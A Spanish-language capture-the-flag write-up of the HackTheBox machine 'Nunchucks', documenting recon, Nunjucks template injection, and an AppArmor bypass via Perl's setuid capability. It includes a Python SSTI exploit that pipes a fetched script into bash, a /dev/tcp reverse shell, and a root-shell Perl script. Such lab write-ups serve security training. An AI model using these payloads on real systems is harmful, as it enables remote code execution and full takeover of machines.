---
title: Nunchucks
published: 2025-03-01
image: "./logo.png"
tags: [Easy, SSTI, AppArmor, eJPT, eWPT]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- NodeJS SSTI (Server Side Template Injection)
- AppArmor Profile Bypass (Privilege Escalation)

### Preparación

- eJPT  
- eWPT

***

## Reconocimiento

Comenzaremos el reconocimiento con un escaneo a los puertos abiertos de esta máquina y que servicios y versiones corren en cada uno.

```
sudo nmap -T4 --min-rate 1000 -p- -sCV -oN nmap_report 10.10.11.122
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FhGIPLvtURyLqXqZvKEc6%2Fimg1.png?alt=media&#x26;token=d63bc10b-ff0f-4a0f-a699-2a8fc3516b9d" alt=""><figcaption></figcaption></figure>

Podemos ver que hay 3 puertos abiertos uno con el servicio **SSH** y 2 con servicios **HTTP** y **HTTPS**, además vemos que usan el dominio _numchucks.htb_ por lo que lo añadiremos al `/etc/hosts`. Además entraremos al dominio a ver que nos encontramos.

### Ffuf

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FQpyOlFNbK0W4VSchcIlP%2Fimg2.png?alt=media&#x26;token=f8186daf-e4b6-4fd9-9970-39c624fa4998" alt=""><figcaption></figcaption></figure>

Vemos que hay un panel de _Login_ y _SignUp_, pero no funcionan, por lo que podríamos aplicar la técnica de **fuzzing**.

```
ffuf -u https://nunchucks.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -r -fs 45
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FmGGmkSLV1Y2S1v2wGEu1%2Fimg3.png?alt=media&#x26;token=7b90a0af-2567-4639-9fbf-47bd88c4e6ef" alt=""><figcaption></figcaption></figure>

Le hemos tenido que añadir un **-fs 45** porque por defecto si no encontraba un directorio te redirigia a una página de este tamaño. No hay nada interesante por lo que podríamos comprobar si esta utilizando **Virtual Hosting** (_VHOST_):

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://nunchucks.htb -H "Host: FUZZ.nunchucks.htb" -mc 200 -fs 30589
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fp4soqiwfyYBM7aHGlkU2%2Fimg4.png?alt=media&#x26;token=a0192f1d-4a22-4df4-bda2-b13497df67c1" alt=""><figcaption></figcaption></figure>

Al igual que antes hubo que aplicar un filtro, pero podemos ver que ha encontrado uno, lo añadiremos también al /etc/hosts y navegaremos a ver que encontramos.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FCfwpR02AgvK7fImnZvBp%2Fimg5.png?alt=media&#x26;token=1e97c906-d06a-4bbb-9949-971c53c24ff3" alt=""><figcaption></figcaption></figure>

### SSTI

Podemos ver una web simple en la que podemos introducir un email y luego se muestra nuestro input. Esto puede causar muchos problemas si está mal sanitizado. En este caso podemos aprovechar un **SSTI** (_Server Side Template Injection_) que es como introducir un XSS en HTML pero para plantillas como puede ser PUG entre otros. Por lo que probaremos con algo simple.

```
{{2+2}}@gmail.com
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F5YjX1N1tJIQNhPiE6aD4%2Fimg6.png?alt=media&#x26;token=4d031111-aa43-4ddc-89c8-f56d5044e98a" alt=""><figcaption></figcaption></figure>

### WhatWeb

Podemos ver que realiza la operación por lo que es vulnerable. Ahora necesitamos saber que tipo de plantilla esta utilizando, por lo que usaremos **whatweb** para sacar más información.

```
whatweb https://store.nunchucks.htb/
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FBLmCIJ7YOm3VjNUjWzWi%2Fimg7.png?alt=media&#x26;token=895b70d9-836b-4c54-a3fe-9074de7710b9" alt=""><figcaption></figcaption></figure>

Podemos ver que corre **Express.js**, veamos que posibles plantillas existen:

* PugJs `#{7*7}` ❎
* Handlebars `${7*7}` ❎
* Nunjucks (Similar al nombre de la máquina) `{{7*7}}` ✅

## Explotación

&#x20;Vamos a crear un exploit en **python** para poder explotar esta vulnerabilidad.


```python
#!/usr/bin/python3

import requests
from urllib3.exceptions import InsecureRequestWarning

def main():
    try:
        # Suppress the warnings from urllib3
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

        payload = """{{range.constructor("return global.process.mainModule.require('child_process').execSync('curl http://10.10.14.16/index.html | bash ')")()}}"""
        response = requests.post(
            url="https://store.nunchucks.htb/api/submit",
            json={"email": payload},
            verify=False
        )

        if response.status_code == 200:
            print(response.text)
        else:
            print("[x] Something went wrong")
    except Exception as e:
        print(str(e))

if __name__ == "__main__":
    main()
```

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'
```

Con esto podremos establecer una reverse shell con la que podremos obtener la flag de usuario para luego poder hacer una escalada de privilegios y poder conseguir la root flag.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FD3TlztcRuyAPhsYwp6tX%2Fimg8.png?alt=media&#x26;token=536becc5-2b02-426d-8b70-20e9ec600e17" alt=""><figcaption></figcaption></figure>

## Escalada de privilegios

Para la escalación vamos a ver que permisos **root** encontramos.

```
find . -perm -4000 -user root 2>/dev/null
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FIg4u8M7dzf0rzkuU9A2S%2Fimg9.png?alt=media&#x26;token=60d72c2b-7f63-48b8-9c83-687ebc15e492" alt=""><figcaption></figcaption></figure>

```
getcap / -r 2>/dev/null
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fs4K9gDsX4pWZseAkMmUb%2Fimg10.png?alt=media&#x26;token=e291ee66-d39e-41c0-914f-607f6bf055b3" alt=""><figcaption></figcaption></figure>

Aclaración de el uso de estos comandos:

#### 1. **`find . -perm -4000 -user root 2>/dev/null`**

* `find .` → Busca archivos en el directorio actual y sus subdirectorios.
* `-perm -4000` → Filtra los archivos que tienen el **bit SUID** activado. Este bit permite que el archivo se ejecute con los permisos de su propietario en lugar de los del usuario que lo ejecuta.
* `-user root` → Filtra los archivos que pertenecen al usuario `root`.
* `2>/dev/null` → Redirige los errores (como permisos denegados) a `/dev/null` para que no se muestren en la salida.

**¿Para qué sirve?**\
Encuentra archivos con permisos **SUID** de `root`, lo que es útil en auditorías de seguridad, ya que estos archivos pueden permitir la escalada de privilegios si tienen vulnerabilidades.

#### 2. **`getcap / -r 2>/dev/null`**

* `getcap / -r` → Busca en todo el sistema (`/`) archivos con **capabilities** activadas y muestra sus capacidades.
* `2>/dev/null` → Redirige los errores a `/dev/null`.

**¿Para qué sirve?**\
Muestra qué archivos tienen **capabilities** activadas en el sistema.\
En lugar de depender de SUID, Linux tiene un sistema de capacidades (`capabilities`) que otorga permisos específicos sin necesidad de ser `root`.\
Por ejemplo, si un binario tiene `cap_net_admin`, puede modificar interfaces de red sin ser `root`.



Una vez aclarado esto vemos que **perl** tiene capabilities activadas las cuales podríamos intentar explotar con:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FB4zu1VNfRjffiZLMWrcO%2Fimg11.png?alt=media&#x26;token=133f089f-6c88-48cb-ba3c-fe7393e4bf85" alt=""><figcaption></figcaption></figure>

```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fvz7q99TEUxVajmWWH3ww%2Fimg12.png?alt=media&#x26;token=e0e8c32d-16eb-417f-9bfa-ad5ae1286920" alt=""><figcaption></figcaption></figure>

Vemos que funciona, vamos a intentar lanzar un ping a nosotros mismos:

```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "ping -c 1 10.10.14.16";'
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FrszYcniiuAZuKMhsJBrP%2Fimg13.png?alt=media&#x26;token=fb781d7e-52e0-4d9e-8033-90ac819566a8" alt=""><figcaption></figcaption></figure>

```
sudo tcpdump -ni tun0 icmp
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F7PG7ob9vJYzUpUBp72Rq%2Fimg14.png?alt=media&#x26;token=bf08cb44-3fc4-4890-82cd-940778b88764" alt=""><figcaption></figcaption></figure>

No recibimos nada, es posible que algo lo esté bloqueando. Tras una pequeña búsqueda vemos que está protegiéndolo **AppArmor**, que básicamente es una aplicación de protección contra amenazas en linux. Vamos a comprobar si está activa.

```
find \-name \*apparmor\* 2>/dev/null | grep -vE "var|proc|sys|usr"
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FMpuUOb4UpFx31opcEzbr%2Fimg15.png?alt=media&#x26;token=6aa57b94-8e06-4262-a741-b5a8adaf194b" alt=""><figcaption></figcaption></figure>

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F2aSIlFUJFm8McO4aQf2T%2Fimg16.png?alt=media&#x26;token=b4c80b9d-dea1-4b94-9bf9-c33d99ad2d0c" alt=""><figcaption></figcaption></figure>

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F9swyXWpxq1cP8kG5JukX%2Fimg17.png?alt=media&#x26;token=374cb54d-aeb9-4f72-be3a-73b076d47c28" alt=""><figcaption></figcaption></figure>

Podemos ver que hay bastante información sobre **apparmor.d**, vamos a ver que hay en `/opt/backup.pl`.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FqwwXRQU3C6yaoRZXL3Wb%2Fimg18.png?alt=media&#x26;token=d3921caf-dab2-4ff5-90a7-5e90d3b6212d" alt=""><figcaption></figcaption></figure>

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F6Or04vWcoATYNAqw3FLY%2Fimg19.png?alt=media&#x26;token=8043821e-9e47-4e3b-b033-f27f362cde67" alt=""><figcaption></figcaption></figure>

Vemos que solo tenemos permisos de ejecución y no de escritura. Buscando vulnerabilidades de AppArmor podemos encontrar una relacionada con [perl](https://bugs.launchpad.net/apparmor/+bug/1911431).

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fh3MZUVt59BVww1zbo6Xo%2Fimg20.png?alt=media&#x26;token=1467510d-8f85-48b5-bb8e-f74b9bba3726" alt=""><figcaption></figcaption></figure>

Podemos ganar privilegios con el mismo script del **GTFObins** pero usando el _shebang._


```bash
#!/usr/bin/perl

use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
```


<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FyFayqo7H7Mj34gGyViDI%2Fimg21.png?alt=media&#x26;token=5657d109-3ff5-417e-89e8-3d7307df4d6c" alt=""><figcaption></figcaption></figure>

Vemos que después de darle permisos y ejecutarlo, obtenemos la flag root.

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/414)

---